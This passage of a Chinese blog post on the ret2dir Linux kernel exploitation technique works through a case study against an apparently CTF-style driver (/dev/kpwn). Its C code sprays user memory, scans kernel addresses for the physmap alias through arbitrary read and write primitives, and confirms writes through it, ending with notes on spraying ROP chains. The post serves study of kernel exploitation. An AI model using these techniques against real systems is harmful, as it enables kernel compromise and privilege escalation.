+<p>执行exp时有时候会遇到内存不足的问题，由于我们要提高physmap的命中率，所以要尽可能耗尽所有内存进行内存喷射，我们的exp是申请了64MB的内存，我们可以进入内核使用<code>free -h</code>查看<code>available</code>的数值大小，也就是应用程序可用内存。这里我在<strong>run.sh</strong>中设置128M内存时是不够用的，256M内存又搜半天没结果，后面我用150M内存进入内核一下子就碰撞到physmap。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309121624100.png"
+                      class=""
+                >
+
+<p>但有时候hit时并不是直接到了我们喷射的内存中，而是我们加载到内存中的代码，这样的话我们在每次找到pos时就不要用break退出了，这样就能找到我们实际大量申请的内存。其实还有种更改的方案是自定义一个不需要指定target的类似memmem的函数，这样就不会需要硬编码写target了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309133155698.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309134242679.png"
+                      class=""
+                >
+
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// memmem替代函数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_series</span><span class="params">(<span class="type">char</span> *buf,<span class="type">size_t</span> buflen,<span class="type">char</span> c,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (buf == <span class="literal">NULL</span> || buflen == <span class="number">0</span> || len &gt; buflen || len &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;buflen;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(buf[i]==c)</span><br><span class="line">            count++;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            count=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(count==len)</span><br><span class="line">            <span class="keyword">return</span> i-len+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后就能一遍找到对应喷射内存，然后我想验证用户空间与内核空间在physmap上的对应关系，这里我尝试了改用户空间的内容再在原来内核空间搜索到的位置来验证，但是却不能正确修改，而是在其它地址位置能找到修改后的内容。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kpwn&quot;</span>,O_RDONLY); </span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u64 *buf64 = (u64 *)buf;</span><br><span class="line">    add_any(fd,<span class="number">0x200</span>,buf64);</span><br><span class="line">    </span><br><span class="line">    u64 slab_addr = buf64[<span class="number">0</span>];</span><br><span class="line">    loglx(<span class="string">&quot;raw_slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    slab_addr = slab_addr &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">    loglx(<span class="string">&quot;slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    del_any(fd,slab_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">        <span class="comment">// 内存喷射，大量在用户空间申请内存</span></span><br><span class="line">        <span class="type">void</span> *mp;</span><br><span class="line">        mp = mmap(<span class="literal">NULL</span>,mp_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(mp==MAP_FAILED)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap error\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(mp,<span class="string">&#x27;A&#x27;</span>,mp_size);</span><br><span class="line">        spray[i]=mp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (u64 addr=slab_addr;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        <span class="comment">// 内存搜索，寻找连串的A开始的地址，也就是对应用户空间相应的内存</span></span><br><span class="line">        </span><br><span class="line">        u64 pos = <span class="number">0</span>;</span><br><span class="line">        u64 addr_to_change;</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">        read_any(fd,addr,buf,<span class="number">0x1000</span>);</span><br><span class="line">        pos = find_series(buf,<span class="number">0x1000</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">        <span class="keyword">if</span> (pos!=<span class="number">-1</span>)&#123;</span><br><span class="line">            addr_to_change = addr + pos;</span><br><span class="line">            loglx(<span class="string">&quot;physmap hit!&quot;</span>,addr);</span><br><span class="line">            loglx(<span class="string">&quot;addr_to_change&quot;</span>,addr_to_change);</span><br><span class="line">            loginfo(<span class="string">&quot;changing spray&quot;</span>);</span><br><span class="line"></span><br><span class="line">            add_any(fd,<span class="number">0x500</span>,buf);      <span class="comment">//方便打断点</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">                <span class="built_in">memset</span>(spray[i],<span class="string">&#x27;B&#x27;</span>,<span class="number">0x1000</span>);    <span class="comment">// 在用户态修改对应内存</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 查看内核态对应位置内容是否变化</span></span><br><span class="line">            <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">            read_any(fd,addr_to_change,buf,<span class="number">0x40</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309155512009.png"
+                      class=""
+                >
+
+<p>但如果是改内核空间的内容，然后在用户态查看内容是否有被修改，就能轻易的验证。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">x64dump</span><span class="params">(<span class="type">char</span> *buf,<span class="type">uint32_t</span> num)</span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 =  (<span class="type">uint64_t</span> *)buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-x64dump-] start : \n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span> &amp;&amp; i!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016lx &quot;</span>,*(buf64+i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[-x64dump-] end ... \n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u64 *<span class="title function_">check</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">        u64 *p = spray[i];</span><br><span class="line">        <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(j&lt;mp_size/<span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p[j]!=<span class="number">0x4141414141414141</span>)&#123;</span><br><span class="line">                loglx(<span class="string">&quot;check change&quot;</span>,(u64)&amp;p[j]);</span><br><span class="line">                <span class="comment">/*x64dump((void *)&amp;p[j],0x20);*/</span></span><br><span class="line">                <span class="keyword">return</span> &amp;p[j];</span><br><span class="line">            &#125;</span><br><span class="line">            j+=<span class="number">0x1000</span>/<span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kpwn&quot;</span>,O_RDONLY); </span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u64 *buf64 = (u64 *)buf;</span><br><span class="line">    add_any(fd,<span class="number">0x200</span>,buf64);</span><br><span class="line">    </span><br><span class="line">    u64 slab_addr = buf64[<span class="number">0</span>];</span><br><span class="line">    loglx(<span class="string">&quot;raw_slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    slab_addr = slab_addr &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">    loglx(<span class="string">&quot;slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    del_any(fd,slab_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">        <span class="comment">// 内存喷射，大量在用户空间申请内存</span></span><br><span class="line">        <span class="type">void</span> *mp;</span><br><span class="line">        mp = mmap(<span class="literal">NULL</span>,mp_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(mp==MAP_FAILED)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap error\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(mp,<span class="string">&#x27;A&#x27;</span>,mp_size);</span><br><span class="line">        spray[i]=mp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (u64 addr=slab_addr;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        <span class="comment">// 内存搜索，寻找连串的A开始的地址，也就是对应用户空间相应的内存</span></span><br><span class="line">        </span><br><span class="line">        u64 pos = <span class="number">0</span>;</span><br><span class="line">        u64 addr_to_change;</span><br><span class="line">        <span class="type">char</span> *dirty = <span class="string">&quot;BBBBBBBBBBBBBBBB&quot;</span>;</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">        read_any(fd,addr,buf,<span class="number">0x1000</span>);</span><br><span class="line">        pos = find_series(buf,<span class="number">0x1000</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">        <span class="keyword">if</span> (pos!=<span class="number">-1</span>)&#123;</span><br><span class="line">            addr_to_change = addr + pos;</span><br><span class="line">            loglx(<span class="string">&quot;physmap hit!&quot;</span>,addr);</span><br><span class="line">            loglx(<span class="string">&quot;addr_to_change&quot;</span>,addr_to_change);</span><br><span class="line"></span><br><span class="line">            write_any(fd,addr_to_change,dirty,<span class="number">0x10</span>);</span><br><span class="line">            u64 *p = check();</span><br><span class="line">            <span class="keyword">if</span> (p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                loginfo(<span class="string">&quot;dirty success!&quot;</span>);</span><br><span class="line">                x64dump((<span class="type">char</span> *)p,<span class="number">0x10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>最后就能成功修改了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309162954125.png"
+                      class=""
+                >
+
+<p>这里这个case是采用内存搜索的方式进行寻找我们与用户空间相同的物理映射，实际上一般的kernel题不会有任意地址读取返回的内存搜索机会。一般而言我们可以直接在用户空间布置大量具有slide性质的rop链，然后靠溢出等漏洞劫持程序执行流返回到rop链。这里虽然说可能改用户态数据不好精确定位到内核中<strong>physmap</strong>的具体位置，但是由于该映射关系的存在，只要我们在内存中填满rop链，就有很高的概率能够执行我们想要的内容。在实际运用中，只要我们知道了内核的基地址，然后就能够直接劫持执行流到<strong>physmap</strong>的较高地址处。</p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>標題:</strong> ret2dir手法学习</li>
+        <li><strong>作者:</strong> collectcrop</li>
+        <li><strong>撰寫于
+                :</strong> 2025-03-09 17:07:15</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-03-09 17:07:31
+            </li>
+        
+        <li>
+            <strong>連結:</strong> https://collectcrop.github.io/2025/03/09/ret2dir手法学习/
+        </li>
+        <li>
+            <strong>
+                版權宣告:
+            </strong>
+            
+
+            
+                本作品采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/blog/tags/pwn/">#pwn</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/blog/tags/kernel/">#kernel</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+  <div class="recommended-article px-2 sm:px-6 md:px-8">
+   <div class="recommended-desktop">
+    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>推荐阅读</span>
+    </div>
+    <div class="recommended-article-group"><a class="recommended-article-item" href="/blog/2025/03/09/ret2usr利用手法以及常见保护机制绕过浅析/" title="ret2usr利用手法以及常见保护机制绕过浅析" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="ret2usr利用手法以及常见保护机制绕过浅析" class="!max-w-none">
+  <span class="title">ret2usr利用手法以及常见保护机制绕过浅析</span>
+</a><a class="recommended-article-item" href="/blog/2025/02/22/kernel-pwn初探/" title="kernel pwn初探" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="kernel pwn初探" class="!max-w-none">
+  <span class="title">kernel pwn初探</span>
+</a><a class="recommended-article-item" href="/blog/2024/10/02/非栈上格式化字符串一次利用/" title="非栈上格式化字符串一次利用" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="非栈上格式化字符串一次利用" class="!max-w-none">
+  <span class="title">非栈上格式化字符串一次利用</span>
+</a></div>
+   </div>
+   <div class="recommended-mobile">
+   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>推荐阅读</span>
+   </div>
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/blog/2025/03/09/ret2usr利用手法以及常见保护机制绕过浅析/" title="ret2usr利用手法以及常见保护机制绕过浅析" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="ret2usr利用手法以及常见保护机制绕过浅析" class="!max-w-none">
+  <span class="title">ret2usr利用手法以及常见保护机制绕过浅析</span>
+</a><a class="recommended-article-item" href="/blog/2025/02/22/kernel-pwn初探/" title="kernel pwn初探" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="kernel pwn初探" class="!max-w-none">
+  <span class="title">kernel pwn初探</span>
+</a></div>
+   </div>
+  </div>
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">ret2usr利用手法以及常见保护机制绕过浅析</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目錄</div>
+		<div class="page-title">ret2dir手法学习</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0"><span class="nav-text">ret2dir手法学习</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Case-Study"><span class="nav-text">Case Study</span></a></li></ol></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/blog/">collectcrop</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共 20 篇文章
+                    </span>
+                    
+                        <span>
+                            共 75.1k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">讀者</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">閱覽</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm"><?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 框架</span>
+            <span class="text-sm lg:block">主題&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.1</a></span>
+        </div>
+        
+        
+            <div>
+                博客已運行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小時 <span class="odometer" id="runtime_minutes"></span> 分鐘 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/blog/build/js/libs/Swup.min.js"></script>
+
+<script src="/blog/build/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/blog/build/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/blog/build/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/blog/build/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/blog/build/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/blog/build/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/blog/build/js/utils.js" type="module"></script>
+
+<script src="/blog/build/js/main.js" type="module"></script>
+
+<script src="/blog/build/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/blog/build/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/blog/build/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/blog/build/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/blog/build/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/blog/build/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/blog/build/js/tools/runtime.js"></script>
+
+    
+<script src="/blog/build/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/blog/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/blog/build/js/libs/Typed.min.js"></script>
+
+  
+<script src="/blog/build/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="/blog/build/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/blog/build/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/blog/build/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/blog/build/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/blog/build/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
